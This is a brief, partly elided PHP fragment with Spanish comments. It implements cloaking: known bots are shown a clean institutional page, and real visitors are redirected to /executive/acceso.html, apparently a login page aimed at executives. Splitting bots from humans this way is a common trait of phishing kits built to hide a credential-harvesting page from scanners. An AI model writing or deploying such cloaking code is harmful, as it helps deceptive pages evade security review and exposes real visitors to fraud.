 ...
 *   · Bots conocidos → página institucional limpia (no los envía a /executive/)
 *   · Visitantes reales → redirige a /executive/acceso.html
 */
...
if (!$is_bot) {
    header('Location: /executive/acceso.html', true, 302);
    exit;
}
